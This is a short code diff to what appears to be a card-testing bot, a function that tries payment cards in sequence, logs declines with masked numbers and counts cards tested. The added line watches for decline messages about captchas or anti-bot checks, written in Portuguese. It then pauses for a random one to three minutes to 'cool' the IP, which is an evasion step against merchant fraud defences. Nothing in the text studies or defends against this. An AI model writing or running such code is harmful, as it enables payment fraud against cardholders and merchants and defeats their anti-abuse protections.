@@ -680,6 +680,7 @@ async function cardSession(w) {
       const m = String(r.message || '').slice(0, 120);
       logLine({ t: nowISO(), type: 'decline', mask: maskCard(card.number), msg: m, seq: s.charges });
       if (Math.random() < 0.25) emit('decline', { mask: maskCard(card.number), msg: m });
+      if (/nao chegou ao cartao|nao carregou|captcha|instalacao/i.test(m)) { const cool=60000+Math.floor(Math.random()*120000); try{ logLine({ t: nowISO(), type: 'log', msg: 'muro anti-robou: esfriando IP por '+Math.round(cool/1000)+'s' }); }catch(_){} await sleep(cool); }
     }
     stats.tested++;
     if (cfg.delayMs > 0) await sleep(cfg.delayMs);
